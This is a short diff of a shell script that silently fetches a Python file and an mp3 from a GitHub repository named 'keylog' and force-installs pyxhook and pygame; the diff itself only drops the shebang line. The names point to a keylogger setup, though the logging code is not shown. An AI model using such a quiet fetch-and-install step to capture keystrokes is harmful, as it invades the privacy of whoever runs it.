@@ -1,5 +1,3 @@
-#!/bin/bash
-
 wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/KEYLOG_log.py"
 wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/KEYLOG_music.mp3"
 yes | pip3 install pyxhook pygame 
